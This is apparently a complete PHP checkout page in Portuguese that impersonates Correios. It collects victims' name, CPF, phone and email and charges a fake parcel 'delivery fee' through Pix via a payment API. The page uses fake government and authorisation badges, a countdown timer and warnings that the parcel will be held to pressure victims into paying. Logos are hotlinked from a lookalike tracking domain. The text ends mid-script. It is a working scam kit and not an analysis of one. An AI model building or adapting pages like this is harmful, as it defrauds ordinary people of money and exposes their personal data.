<?php
// ============================================================
//  CONFIGURAÇÃO — edite as 4 linhas abaixo antes de publicar
// ============================================================
define('MANGOFY_API_KEY',    'SUA_API_KEY');          // Obtida no painel Mangofy
define('MANGOFY_STORE_CODE', 'SUA_STORE_CODE');        // Código da loja Mangofy
define('MANGOFY_API_BASE',   'https://SEU_DOMINIO');   // Base URL da sua instância Mangofy
define('PAYMENT_AMOUNT',     5836);                    // Valor em centavos (5836 = R$ 58,36)
define('PRODUCT_NAME',       'Taxa de Entrega');
define('PIX_EXPIRES_DAYS',   1);
// ============================================================

// ── AJAX handlers ─────────────────────────────────────────
if ($_SERVER['REQUEST_METHOD'] === 'POST') {
    header('Content-Type: application/json; charset=utf-8');
    $action = $_POST['action'] ?? '';

    if ($action === 'create_pix') {
        $email    = filter_var($_POST['email']    ?? '', FILTER_SANITIZE_EMAIL);
        $phone    = preg_replace('/\D/', '', $_POST['phone']    ?? '');
        $name     = strip_tags(trim($_POST['name']     ?? ''));
        $document = preg_replace('/\D/', '', $_POST['document'] ?? '');

        $payload = [
            'external_code'   => 'ped-' . uniqid(),
            'payment_method'  => 'pix',
            'payment_format'  => 'regular',
            'installments'    => 1,
            'payment_amount'  => PAYMENT_AMOUNT,
            'shipping_amount' => 0,
            'items' => [[
                'code'         => 'taxa-entrega',
                'name'         => PRODUCT_NAME,
                'quantity'     => 1,
                'price'        => PAYMENT_AMOUNT,
                'digital_flag' => true,
            ]],
            'customer' => [
                'email'    => $email,
                'name'     => $name,
                'document' => $document,
                'phone'    => (strlen($phone) <= 11) ? '55' . $phone : $phone,
                'ip'       => $_SERVER['REMOTE_ADDR'] ?? '127.0.0.1',
            ],
            'pix' => ['expires_in_days' => PIX_EXPIRES_DAYS],
        ];

        echo json_encode(mangofy_request('POST', '/api/v1/payment', $payload));
        exit;
    }

    if ($action === 'check_payment') {
        $code = preg_replace('/[^a-zA-Z0-9\-]/', '', $_POST['payment_code'] ?? '');
        echo json_encode(mangofy_request('GET', '/api/v1/payment/' . $code, null));
        exit;
    }

    http_response_code(400);
    echo json_encode(['error' => 'invalid_action']);
    exit;
}

// ── Mangofy API helper ─────────────────────────────────────
function mangofy_request(string $method, string $path, ?array $body): array {
    $ch = curl_init(MANGOFY_API_BASE . $path);
    curl_setopt_array($ch, [
        CURLOPT_RETURNTRANSFER => true,
        CURLOPT_HTTPHEADER     => [
            'Authorization: '  . MANGOFY_API_KEY,
            'Store-Code: '     . MANGOFY_STORE_CODE,
            'Content-Type: application/json',
            'Accept: application/json',
        ],
        CURLOPT_TIMEOUT        => 30,
        CURLOPT_SSL_VERIFYPEER => true,
    ]);
    if ($method === 'POST') {
        curl_setopt($ch, CURLOPT_POST, true);
        curl_setopt($ch, CURLOPT_POSTFIELDS, json_encode($body));
    }
    $raw      = curl_exec($ch);
    $httpCode = curl_getinfo($ch, CURLINFO_HTTP_CODE);
    $curlErr  = curl_error($ch);
    curl_close($ch);

    if ($curlErr) return ['error' => $curlErr, '_http_code' => 0];
    $data = json_decode($raw, true) ?? ['error' => 'parse_error'];
    $data['_http_code'] = $httpCode;
    return $data;
}

$amount_display = 'R$ ' . number_format(PAYMENT_AMOUNT / 100, 2, ',', '.');
?>
<!DOCTYPE html>
<html lang="pt-BR">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, user-scalable=no">
<title>PAGAMENTO SEGURO - Checkout</title>
<style>
  *, *::before, *::after { box-sizing: border-box; margin: 0; padding: 0; }

  body {
    font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif;
    background: #f0f2f5;
    color: #333;
    min-height: 100vh;
  }

  /* ── Screens ── */
  .screen { display: none; }
  .screen.active { display: block; }

  /* ── Loading ── */
  #screen-loading {
    display: flex;
    flex-direction: column;
    align-items: center;
    justify-content: center;
    min-height: 100vh;
    background: #fff;
    gap: 16px;
  }
  .spinner {
    width: 44px; height: 44px;
    border: 4px solid #e0e0e0;
    border-top-color: #32BCAD;
    border-radius: 50%;
    animation: spin .8s linear infinite;
  }
  @keyframes spin { to { transform: rotate(360deg); } }
  #screen-loading p { color: #666; font-size: 15px; }

  /* ── Checkout ── */
  #screen-checkout {
    max-width: 480px;
    margin: 0 auto;
    padding-bottom: 32px;
  }

  /* Header */
  .checkout-header {
    background: #fff;
    padding: 14px 16px;
    display: flex;
    align-items: center;
    justify-content: center;
    gap: 8px;
    border-bottom: 1px solid #e8e8e8;
    position: sticky;
    top: 0;
    z-index: 10;
  }
  .checkout-header svg { color: #27AE60; }
  .checkout-header span {
    font-size: 13px;
    font-weight: 700;
    letter-spacing: .6px;
    color: #27AE60;
    text-transform: uppercase;
  }

  /* Card container */
  .card {
    background: #fff;
    border-radius: 12px;
    margin: 12px;
    overflow: hidden;
    box-shadow: 0 1px 4px rgba(0,0,0,.08);
  }

  /* Product info */
  .product-banner {
    background: #003D7E;
    padding: 14px 16px;
    display: flex;
    align-items: center;
    gap: 12px;
  }
  .product-banner img { height: 32px; filter: brightness(0) invert(1); }
  .product-banner-text { color: #fff; }
  .product-banner-text small {
    font-size: 11px;
    opacity: .8;
    display: block;
    margin-bottom: 2px;
  }
  .product-banner-text strong { font-size: 14px; }

  .alert-box {
    background: #FFF8E1;
    border-left: 4px solid #F59E0B;
    padding: 10px 14px;
    font-size: 12px;
    color: #78350F;
    line-height: 1.5;
  }
  .alert-box strong { display: block; margin-bottom: 2px; font-size: 12px; }

  /* Order summary */
  .order-summary { padding: 14px 16px; }
  .order-row {
    display: flex;
    justify-content: space-between;
    font-size: 13px;
    color: #555;
    padding: 4px 0;
  }
  .order-row.total {
    border-top: 1px solid #eee;
    margin-top: 8px;
    padding-top: 10px;
    font-weight: 700;
    font-size: 15px;
    color: #111;
  }

  .secure-badge {
    text-align: center;
    padding: 8px;
    font-size: 11px;
    color: #27AE60;
    font-weight: 600;
    letter-spacing: .4px;
    display: flex;
    align-items: center;
    justify-content: center;
    gap: 5px;
    border-top: 1px solid #f0f0f0;
  }

  /* Form */
  .section-title {
    font-size: 13px;
    font-weight: 700;
    color: #333;
    padding: 14px 16px 10px;
    border-bottom: 1px solid #f5f5f5;
  }
  .form-group { padding: 12px 16px 0; }
  .form-group label {
    display: block;
    font-size: 11px;
    font-weight: 600;
    color: #666;
    margin-bottom: 5px;
    text-transform: uppercase;
    letter-spacing: .4px;
  }
  .form-group label .req { color: #e53e3e; margin-left: 2px; }
  .form-group input {
    width: 100%;
    height: 44px;
    border: 1.5px solid #e0e0e0;
    border-radius: 8px;
    padding: 0 12px;
    font-size: 15px;
    color: #111;
    outline: none;
    transition: border-color .2s;
    background: #fafafa;
  }
  .form-group input:focus { border-color: #32BCAD; background: #fff; }
  .form-group input.error { border-color: #e53e3e; }
  .form-group .err-msg {
    font-size: 11px;
    color: #e53e3e;
    margin-top: 4px;
    display: none;
  }
  .form-group .err-msg.show { display: block; }
  .form-bottom-space { height: 14px; }

  /* Payment section */
  .payment-method {
    display: flex;
    align-items: center;
    gap: 10px;
    padding: 12px 16px;
  }
  .pix-logo { height: 26px; }
  .payment-method span { font-size: 13px; color: #555; }

  .btn-pix {
    display: block;
    width: calc(100% - 32px);
    margin: 0 16px 16px;
    height: 52px;
    background: linear-gradient(135deg, #32BCAD, #27a99b);
    color: #fff;
    font-size: 16px;
    font-weight: 700;
    border: none;
    border-radius: 10px;
    cursor: pointer;
    letter-spacing: .3px;
    transition: opacity .2s, transform .1s;
    display: flex;
    align-items: center;
    justify-content: center;
    gap: 10px;
  }
  .btn-pix:hover { opacity: .93; }
  .btn-pix:active { transform: scale(.98); }
  .btn-pix:disabled { opacity: .6; cursor: not-allowed; }

  /* Trust badges */
  .trust-list { padding: 4px 0 8px; }
  .trust-item {
    display: flex;
    align-items: flex-start;
    gap: 12px;
    padding: 10px 16px;
  }
  .trust-item img {
    width: 40px; height: 40px;
    border-radius: 50%;
    object-fit: cover;
    flex-shrink: 0;
  }
  .trust-item-text strong {
    display: block;
    font-size: 13px;
    color: #111;
    margin-bottom: 2px;
  }
  .trust-item-text span { font-size: 12px; color: #666; }

  /* Footer */
  .checkout-footer {
    text-align: center;
    padding: 16px;
    font-size: 11px;
    color: #999;
  }
  .checkout-footer .pay-icons { margin-bottom: 8px; display: flex; justify-content: center; align-items: center; gap: 8px; }
  .checkout-footer .pay-icons img { height: 22px; }

  /* ── PIX Screen ── */
  #screen-pix {
    max-width: 480px;
    margin: 0 auto;
    padding-bottom: 32px;
  }
  .pix-header {
    background: #003D7E;
    padding: 20px 16px;
    text-align: center;
    color: #fff;
  }
  .pix-header h2 { font-size: 18px; margin-bottom: 6px; }
  .pix-header p  { font-size: 13px; opacity: .85; line-height: 1.5; }

  .pix-body { margin: 12px; }

  .pix-important {
    background: #FFF3CD;
    border-radius: 8px;
    padding: 10px 14px;
    font-size: 12px;
    color: #856404;
    margin-bottom: 12px;
    line-height: 1.5;
  }

  .pix-timer-box {
    background: #fff;
    border-radius: 12px;
    padding: 16px;
    text-align: center;
    box-shadow: 0 1px 4px rgba(0,0,0,.08);
    margin-bottom: 12px;
  }
  .pix-timer-label { font-size: 12px; color: #666; margin-bottom: 6px; }
  .pix-timer {
    font-size: 36px;
    font-weight: 700;
    color: #e53e3e;
    font-variant-numeric: tabular-nums;
    letter-spacing: 2px;
  }

  .pix-qr-box {
    background: #fff;
    border-radius: 12px;
    padding: 20px 16px;
    text-align: center;
    box-shadow: 0 1px 4px rgba(0,0,0,.08);
    margin-bottom: 12px;
  }
  .pix-qr-box img {
    width: 200px; height: 200px;
    display: block;
    margin: 0 auto 14px;
    border: 1px solid #eee;
    border-radius: 8px;
    padding: 4px;
  }
  .pix-qr-box .pix-copy-label {
    font-size: 13px;
    color: #555;
    margin-bottom: 10px;
  }
  .pix-qr-box .pix-copy-label strong { font-weight: 700; color: #111; }

  .pix-code-area {
    display: flex;
    gap: 8px;
    align-items: stretch;
  }
  .pix-code-input {
    flex: 1;
    border: 1.5px solid #e0e0e0;
    border-radius: 8px;
    padding: 10px 12px;
    font-size: 11px;
    color: #555;
    word-break: break-all;
    background: #fafafa;
    line-height: 1.4;
    resize: none;
    font-family: monospace;
  }
  .btn-copy {
    background: #32BCAD;
    color: #fff;
    font-size: 13px;
    font-weight: 700;
    border: none;
    border-radius: 8px;
    padding: 0 16px;
    cursor: pointer;
    white-space: nowrap;
    transition: opacity .2s;
  }
  .btn-copy:hover { opacity: .88; }
  .btn-copy.copied { background: #27AE60; }

  .pix-amount {
    font-size: 14px;
    color: #333;
    margin-top: 12px;
    font-weight: 600;
  }

  .btn-confirm {
    display: flex;
    align-items: center;
    justify-content: center;
    gap: 8px;
    width: 100%;
    height: 52px;
    background: linear-gradient(135deg, #27AE60, #219150);
    color: #fff;
    font-size: 15px;
    font-weight: 700;
    border: none;
    border-radius: 10px;
    cursor: pointer;
    letter-spacing: .3px;
    margin-bottom: 12px;
    transition: opacity .2s;
  }
  .btn-confirm:hover { opacity: .92; }

  /* Instructions accordion */
  .pix-instructions {
    background: #fff;
    border-radius: 12px;
    box-shadow: 0 1px 4px rgba(0,0,0,.08);
    overflow: hidden;
  }
  .pix-instructions summary {
    padding: 14px 16px;
    font-size: 14px;
    font-weight: 600;
    color: #003D7E;
    cursor: pointer;
    list-style: none;
    display: flex;
    align-items: center;
    justify-content: space-between;
  }
  .pix-instructions summary::after { content: '▼'; font-size: 10px; }
  .pix-instructions[open] summary::after { content: '▲'; }
  .pix-instructions-body { padding: 0 16px 16px; }
  .pix-step {
    display: flex;
    gap: 12px;
    align-items: flex-start;
    padding: 10px 0;
    border-bottom: 1px solid #f5f5f5;
  }
  .pix-step:last-child { border-bottom: none; }
  .pix-step-num {
    background: #003D7E;
    color: #fff;
    width: 24px; height: 24px;
    border-radius: 50%;
    display: flex;
    align-items: center;
    justify-content: center;
    font-size: 12px;
    font-weight: 700;
    flex-shrink: 0;
    margin-top: 1px;
  }
  .pix-step p { font-size: 13px; color: #555; line-height: 1.5; }
  .pix-step p strong { color: #111; }

  .pix-payment-detail {
    margin-top: 14px;
    font-size: 13px;
    color: #555;
  }
  .pix-payment-detail span { display: flex; justify-content: space-between; padding: 3px 0; }
  .pix-payment-detail strong { color: #111; }

  /* ── Success Screen ── */
  #screen-success {
    max-width: 480px;
    margin: 0 auto;
    min-height: 100vh;
    display: flex;
    flex-direction: column;
    align-items: center;
    justify-content: center;
    padding: 32px 16px;
    text-align: center;
    background: #fff;
  }
  .success-icon {
    width: 80px; height: 80px;
    background: #27AE60;
    border-radius: 50%;
    display: flex;
    align-items: center;
    justify-content: center;
    margin: 0 auto 20px;
    animation: popIn .4s cubic-bezier(.175,.885,.32,1.275);
  }
  @keyframes popIn {
    from { transform: scale(0); opacity: 0; }
    to   { transform: scale(1); opacity: 1; }
  }
  .success-icon svg { color: #fff; width: 44px; height: 44px; }
  #screen-success h2 { font-size: 22px; color: #111; margin-bottom: 8px; }
  #screen-success p  { font-size: 14px; color: #666; line-height: 1.6; max-width: 300px; }
  #screen-success img { margin: 24px auto; height: 40px; display: block; }

  /* Responsive */
  @media (max-width: 480px) {
    #screen-checkout, #screen-pix { padding-bottom: 20px; }
  }
</style>
</head>
<body>

<!-- ══ LOADING ══════════════════════════════════════════════ -->
<div id="screen-loading">
  <div class="spinner"></div>
  <p>Processando pagamento!</p>
</div>

<!-- ══ CHECKOUT ═════════════════════════════════════════════ -->
<div id="screen-checkout" class="screen">

  <div class="checkout-header">
    <svg xmlns="http://www.w3.org/2000/svg" width="16" height="16" fill="currentColor" viewBox="0 0 16 16">
      <path d="M8 1a2 2 0 0 1 2 2v4H6V3a2 2 0 0 1 2-2zm3 6V3a3 3 0 0 0-6 0v4a2 2 0 0 0-2 2v5a2 2 0 0 0 2 2h6a2 2 0 0 0 2-2V9a2 2 0 0 0-2-2z"/>
    </svg>
    <span>Pagamento Seguro</span>
  </div>

  <!-- Product card -->
  <div class="card">
    <div class="product-banner">
      <img src="https://rastreamento-atendimento.help/cliente/42254/imgs/logo-ect.svg" alt="Correios">
      <div class="product-banner-text">
        <small>Encomenda retida</small>
        <strong>Correios — Taxa de Entrega</strong>
      </div>
    </div>
    <div class="alert-box">
      <strong>⚠ IMPORTANTE</strong>
      O não pagamento da taxa de entrega dentro do prazo informado pode impedir a liberação do envio.
      <em>Após realizar o pagamento, permaneça nesta tela até a confirmação.</em>
    </div>
    <div class="order-summary">
      <div class="order-row">
        <span>Taxa de Entrega</span>
        <span>Subtotal</span>
      </div>
      <div class="order-row">
        <span><?php echo htmlspecialchars(PRODUCT_NAME); ?></span>
        <span><?php echo $amount_display; ?></span>
      </div>
      <div class="order-row total">
        <span>Total</span>
        <span><?php echo $amount_display; ?></span>
      </div>
    </div>
    <div class="secure-badge">
      <svg xmlns="http://www.w3.org/2000/svg" width="12" height="12" fill="currentColor" viewBox="0 0 16 16">
        <path d="M8 1a2 2 0 0 1 2 2v4H6V3a2 2 0 0 1 2-2zm3 6V3a3 3 0 0 0-6 0v4a2 2 0 0 0-2 2v5a2 2 0 0 0 2 2h6a2 2 0 0 0 2-2V9a2 2 0 0 0-2-2z"/>
      </svg>
      PAGAMENTO 100% SEGURO
    </div>
  </div>

  <!-- Form card -->
  <div class="card">
    <div class="section-title">Identificação</div>
    <p style="font-size:12px;color:#888;padding:8px 16px 0;">Preencha os campos obrigatórios corretamente para continuar.</p>

    <form id="checkout-form" novalidate>
      <div class="form-group">
        <label>E-mail <span class="req">*obrigatório</span></label>
        <input type="email" id="f-email" name="email" placeholder="seu@email.com" autocomplete="email">
        <div class="err-msg" id="err-email">Informe um e-mail válido.</div>
      </div>
      <div class="form-group">
        <label>Telefone / WhatsApp <span class="req">*obrigatório</span></label>
        <input type="tel" id="f-phone" name="phone" placeholder="(11) 99999-9999" autocomplete="tel" maxlength="15">
        <div class="err-msg" id="err-phone">Informe um telefone válido.</div>
      </div>
      <div class="form-group">
        <label>Nome completo <span class="req">*obrigatório</span></label>
        <input type="text" id="f-name" name="name" placeholder="Seu nome completo" autocomplete="name">
        <div class="err-msg" id="err-name">Informe seu nome completo.</div>
      </div>
      <div class="form-group">
        <label>CPF <span class="req">*obrigatório</span></label>
        <input type="text" id="f-cpf" name="cpf" placeholder="000.000.000-00" maxlength="14">
        <div class="err-msg" id="err-cpf">Informe um CPF válido.</div>
      </div>
      <div class="form-bottom-space"></div>

      <!-- Payment section -->
      <div class="section-title">Pagamento</div>
      <div class="payment-method">
        <img class="pix-logo" src="https://rastreamento-atendimento.help/cliente/42254/imgs/logo-pix.png" alt="Pix">
        <span>Pagamento via Pix — instantâneo e seguro</span>
      </div>
      <p style="font-size:12px;color:#888;padding:0 16px 12px;">
        Ao clicar no botão abaixo, você será encaminhado para um ambiente seguro para finalizar seu pagamento.
      </p>

      <button type="submit" class="btn-pix" id="btn-pix">
        <svg xmlns="http://www.w3.org/2000/svg" width="20" height="20" fill="none" viewBox="0 0 512 512">
          <path fill="currentColor" d="M112.57 391.19c20.056 0 38.928-7.808 53.12-22l79.616-79.616c5.632-5.632 15.36-5.6 20.992 0l79.936 79.936c14.176 14.176 33.056 22 53.12 22h15.745l-100.833 100.8c-41.408 41.44-108.64 41.44-150.048 0L63.394 391.19h49.175zm286.784-271.36c-20.064 0-38.944 7.808-53.12 22l-79.936 79.936c-5.824 5.824-15.168 5.824-20.992 0l-79.616-79.616c-14.192-14.192-33.072-22-53.12-22H63.394l100.832-100.8c41.408-41.44 108.64-41.44 150.048 0L414.655 119.9l-15.3-.07zM476.414 173.3l-63.713-63.744-78.815 78.88c-20.576 20.576-56.48 20.576-77.056 0l-79.68-79.68a38.555 38.555 0 0 0-27.232-11.2H108.19L44.254 163.5c-41.44 41.408-41.44 108.64 0 150.048l63.936 63.968h41.152c10.24 0 19.84-3.968 27.04-11.2l79.68-79.68c10.496-10.496 24.512-16.288 39.36-16.288s28.864 5.792 39.36 16.288l80 80a38.515 38.515 0 0 0 27.232 11.2h40.64l63.68-63.648c41.44-41.44 41.44-108.64.062-150.048z"/>
        </svg>
        Gerar Pix
      </button>
    </form>
  </div>

  <!-- Trust badges -->
  <div class="card">
    <div class="trust-list">
      <div class="trust-item">
        <img src="https://plans-reviews.s3.amazonaws.com/uploads/user/M521rZJdXqgeaXo/plans-reviews/public/phpaS2UvD.jpg" alt="">
        <div class="trust-item-text">
          <strong>Pix Imediato!</strong>
          <span>Após o pagamento da taxa o produto é liberado em até 24 Horas.</span>
        </div>
      </div>
      <div class="trust-item">
        <img src="https://plans-reviews.s3.amazonaws.com/uploads/user/M521rZJdXqgeaXo/plans-reviews/public/phpZ02sjY.jpg" alt="">
        <div class="trust-item-text">
          <strong>Verificação</strong>
          <span>Empresa autorizada e verificada a receber valores de taxa federal.</span>
        </div>
      </div>
      <div class="trust-item">
        <img src="https://plans-reviews.s3.amazonaws.com/uploads/user/M521rZJdXqgeaXo/plans-reviews/public/phpK9KfhZ.jpg" alt="">
        <div class="trust-item-text">
          <strong>Governo Federal</strong>
          <span>Programa do Governo Federal <?php echo date('Y'); ?>.</span>
        </div>
      </div>
    </div>
  </div>

  <!-- Footer -->
  <div class="checkout-footer">
    <div class="pay-icons">
      <img src="https://rastreamento-atendimento.help/cliente/42254/imgs/logo-pix.png" alt="Pix">
    </div>
    <div>© <?php echo date('Y'); ?> PAGAMENTO SEGURO</div>
    <div style="margin-top:4px;">
      <img src="https://rastreamento-atendimento.help/cliente/42254/imgs/logo-ect.svg" alt="Correios" style="height:20px;opacity:.5;">
    </div>
    <div style="margin-top:6px;font-size:10px;color:#bbb;">Ambiente seguro</div>
  </div>
</div>

<!-- ══ PIX SCREEN ════════════════════════════════════════════ -->
<div id="screen-pix" class="screen">

  <div class="pix-header">
    <h2>Falta pouco!</h2>
    <p>Para finalizar o pagamento, utilize o PIX!</p>
  </div>

  <div class="pix-body">

    <div class="pix-important">
      <strong>⚠ Importante:</strong> Após pagar, permaneça nesta tela para confirmação automática.
      O fechamento precoce pode atrasar a liberação do seu pedido.
    </div>

    <div class="pix-timer-box">
      <div class="pix-timer-label">O código expira em:</div>
      <div class="pix-timer" id="pix-timer">10:00</div>
    </div>

    <div class="pix-qr-box">
      <img id="pix-qr-img" src="" alt="QR Code Pix">

      <div class="pix-copy-label">
        Copie a chave abaixo e utilize a opção <strong>PIX Copia e Cola</strong>:
      </div>
      <div class="pix-code-area">
        <textarea class="pix-code-input" id="pix-code-text" readonly rows="3"></textarea>
        <button class="btn-copy" id="btn-copy" type="button">COPIAR<br>CÓDIGO</button>
      </div>
      <div class="pix-amount">Valor a ser pago: <strong><?php echo $amount_display; ?></strong></div>
    </div>

    <button class="btn-confirm" id="btn-confirm" type="button">
      <svg xmlns="http://www.w3.org/2000/svg" width="18" height="18" fill="currentColor" viewBox="0 0 16 16">
        <path d="M13.854 3.646a.5.5 0 0 1 0 .708l-7 7a.5.5 0 0 1-.708 0l-3.5-3.5a.5.5 0 1 1 .708-.708L6.5 10.293l6.646-6.647a.5.5 0 0 1 .708 0z"/>
      </svg>
      JÁ REALIZEI O PAGAMENTO
    </button>

    <details class="pix-instructions">
      <summary>Instruções para pagamento</summary>
      <div class="pix-instructions-body">
        <div class="pix-step">
          <div class="pix-step-num">1</div>
          <p>Após copiar o código, abra seu aplicativo de pagamento onde você utiliza o Pix.</p>
        </div>
        <div class="pix-step">
          <div class="pix-step-num">2</div>
          <p>Escolha a opção <strong>PIX Copia e Cola</strong> e insira o código copiado.</p>
        </div>
        <div class="pix-step">
          <div class="pix-step-num">3</div>
          <p>Confirme as informações e finalize seu pagamento.</p>
        </div>
        <div class="pix-payment-detail">
          <span><span>Valor total:</span> <strong><?php echo $amount_display; ?></strong></span>
        </div>
        <div style="margin-top:12px;text-align:center;">
          <img src="https://rastreamento-atendimento.help/cliente/42254/imgs/logo-pix.png" alt="Pix" style="height:24px;">
        </div>
        <div style="font-size:11px;color:#aaa;text-align:center;margin-top:8px;">Ambiente seguro</div>
      </div>
    </details>

  </div>
</div>

<!-- ══ SUCCESS SCREEN ════════════════════════════════════════ -->
<div id="screen-success" class="screen">
  <div class="success-icon">
    <svg xmlns="http://www.w3.org/2000/svg" fill="currentColor" viewBox="0 0 16 16">
      <path d="M13.854 3.646a.5.5 0 0 1 0 .708l-7 7a.5.5 0 0 1-.708 0l-3.5-3.5a.5.5 0 1 1 .708-.708L6.5 10.293l6.646-6.647a.5.5 0 0 1 .708 0z"/>
    </svg>
  </div>
  <h2>Pagamento Confirmado!</h2>
  <p>Sua encomenda será liberada em até 24 horas. Você receberá uma notificação quando estiver a caminho.</p>
  <img src="https://rastreamento-atendimento.help/cliente/42254/imgs/logo-ect.svg" alt="Correios">
</div>

<script>
// ── helpers ──────────────────────────────────────────────────
function show(id) {
  document.querySelectorAll('.screen').forEach(s => s.classList.remove('active'));
  const el = document.getElementById(id);
  if (el) { el.classList.add('active'); el.style.display = ''; }
  // hide loading (not a .screen)
  document.getElementById('screen-loading').style.display = id === 'loading' ? '' : 'none';
}

function showLoading(msg) {
  document.querySelectorAll('.screen').forEach(s => s.classList.remove('active'));
  const lEl = document.getElementById('screen-loading');
  lEl.style.display = 'flex';
  lEl.querySelector('p').textContent = msg || 'Processando...';
}

// ── masks ─────────────────────────────────────────────────────
document.getElementById('f-phone').addEventListener('input', function() {
  let v = this.value.replace(/\D/g, '').slice(0, 11);
  if (v.length > 6) v = '(' + v.slice(0,2) + ') ' + v.slice(2,7) + '-' + v.slice(7);
  else if (v.length > 2) v = '(' + v.slice(0,2) + ') ' + v.slice(2);
  else if (v.length > 0) v = '(' + v;
  this.value = v;
});

document.getElementById('f-cpf').addEventListener('input', function() {
  let v = this.value.replace(/\D/g, '').slice(0, 11);
  if (v.length > 9)      v = v.slice(0,3)+'.'+v.slice(3,6)+'.'+v.slice(6,9)+'-'+v.slice(9);
  else if (v.length > 6) v = v.slice(0,3)+'.'+v.slice(3,6)+'.'+v.slice(6);
  else if (v.length > 3) v = v.slice(0,3)+'.'+v.slice(3);
  this.value = v;
});

// ── validation ───────────────────────────────────────────────
function validEmail(v) { return /^[^\s@]+@[^\s@]+\.[^\s@]+$/.test(v); }
function validPhone(v) { return v.replace(/\D/g,'').length >= 10; }
function validCPF(v)   {
  const d = v.replace(/\D/g,'');
  if (d.length !== 11 || /^(\d)\1+$/.test(d)) return false;
  let s = 0;
  for (let i = 0; i < 9; i++) s += +d[i] * (10 - i);
  let r = (s * 10) % 11; if (r >= 10) r = 0;
  if (r !== +d[9]) return false;
  s = 0;
  for (let i = 0; i < 10; i++) s += +d[i] * (11 - i);
  r = (s * 10) % 11; if (r >= 10) r = 0;
  return r === +d[10];
}

function setErr(fieldId, errId, show) {
  document.getElementById(fieldId).classList.toggle('error', show);
  document.getElementById(errId).classList.toggle('show', show);
}

// ── pix timer ────────────────────────────────────────────────
let timerInterval = null;

function startTimer(minutes) {
  let total = minutes * 60;
  const el  = document.getElementById('pix-timer');
  clearInterval(timerInterval);
  timerInterval = setInterval(() => {
    if (total <= 0) {
      clearInterval(timerInterval);
      el.textContent = '00:00';
      el.style.color = '#aaa';
      return;
    }
    total--;
    const m = String(Math.floor(total / 60)).padStart(2, '0');
    const s = String(total % 60).padStart(2, '0');
    el.textContent = m + ':' + s;
  }, 1000);
}

// ── payment polling ───────────────────────────────────────────
let pollInterval = null;
let currentPaymentCode = '';

function startPolling(paymentCode) {
  currentPaymentCode = paymentCode;
  clearInterval(pollInterval);
  pollInterval = setInterval(async () => {
    try {
      const fd = new FormData();
      fd.append('action', 'check_payment');
      fd.append('payment_code', paymentCode);
      const res  = await fetch('', { method: 'POST', body: fd });
      const data = await res.json();
      if (data.payment_status === 'approved') {
        clearInterval(pollInterval);
        clearInterval(timerInterval);
        show('screen-success');
      }
    } catch (_) {}
  }, 5000);
}

// ── copy button ───────────────────────────────────────────────
document.getElementById('btn-copy').addEventListener('click', function() {
  const txt = document.getElementById('pix-code-text').value;
  navigator.clipboard.writeText(txt).then(() => {
    this.textContent = '✓ COPIADO';
    this.classList.add('copied');
    setTimeout(() => { this.innerHTML = 'COPIAR<br>CÓDIGO'; this.classList.remove('copied'); }, 2500);
  }).catch(() => {
    // fallback
    const ta = document.getElementById('pix-code-text');
    ta.select();
    document.execCommand('copy');
    this.textContent = '✓ COPIADO';
    this.classList.add('copied');
    setTimeout(() => { this.innerHTML = 'COPIAR<br>CÓDIGO'; this.classList.remove('copied'); }, 2500);
  });
});

// ── "already paid" button ──────────────────────────────────────
document.getElementById('btn-confirm').addEventListener('click', async function() {
  if (!currentPaymentCode) return;
  this.disabled = true;
  this.textContent = 'Verificando...';
  try {
    const fd = new FormData();
    fd.append('action', 'check_payment');
    fd.append('payment_code', currentPaymentCode);
    const res  = await fetch('', { method: 'POST', body: fd });
    const data = await res.json();
    if (data.payment_status === 'approved') {
      clearInterval(pollInterval);
      clearInterval(timerInterval);
      show('screen-success');
    } else {
      this.disabled = false;
      this.innerHTML = '<svg xmlns="http://www.w3.org/2000/svg" width="18" height="18" fill="currentColor" viewBox="0 0 16 16"><path d="M13.854 3.646a.5.5 0 0 1 0 .708l-7 7a.5.5 0 0 1-.708 0l-3.5-3.5a.5.5 0 1 1 .708-.708L6.5 10.293l6.646-6.647a.5.5 0 0 1 .708 0z"/></svg> JÁ REALIZEI O PAGAMENTO';
      alert('Pagamento ainda não identificado. Aguarde alguns instantes e tente novamente.');
    }
  } catch (e) {
    this.disabled = false;
    this.innerHTML = '<svg xmlns="http://www.w3.org/2000/svg" width="18" height="18" fill="currentColor" viewBox="0 0 16 16"><path d="M13.854 3.646a.5.5 0 0 1 0 .708l-7 7a.5.5 0 0 1-.708 0l-3.5-3.5a.5.5 0 1 1 .708-.708L6.5 10.293l6.646-6.647a.5.5 0 0 1 .708 0z"/></svg> JÁ REALIZEI O PAGAMENTO';
  }
});

// ── form submit ───────────────────────────────────────────────
document.getElementById('checkout-form').addEventListener('submit', async function(e) {
  e.preventDefault();

  const email = document.getElementById('f-email').value.trim();
  const phone = document.getElementById('f-phone').value.trim();
  const name  = document.getElementById('f-name').value.trim();
  const cpf   = document.getElementById('f-cpf').value.trim();

  let ok = true;
  if (!validEmail(email)) { setErr('f-email','err-email',true); ok = false; } else { setErr('f-email','err-email',false); }
  if (!validPhone(phone)) { setErr('f-phone','err-phone',true); ok = false; } else { setErr('f-phone','err-phone',false); }
  if (name.split(' ').filter(Boolean).length < 2) { setErr('f-name','err-name',true); ok = false; } else { setErr('f-name','err-name',false); }
  if (!validCPF(cpf))   { setErr('f-cpf','err-cpf',true);   ok = false; } else { setErr('f-cpf','err-cpf',false); }
  if (!ok) return;

  const btn = document.getElementById('btn-pix');
  btn.disabled = true;
  btn.textContent = 'Aguarde...';
  showLoading('Gerando Pix...');

  try {
    const fd = new FormData();
    fd.append('action',   'create_pix');
    fd.append('email',    email);
    fd.append('phone',    phone);
    fd.append('name',     name);
    fd.append('document', cpf);

    const res  = await fetch('', { method: 'POST', body: fd });
    const data = await res.json();

    if (data.error || data._http_code >= 400) {
      alert('Erro ao gerar Pix: ' + (data.message || data.error || 'Tente novamente.'));
      btn.disabled = false;
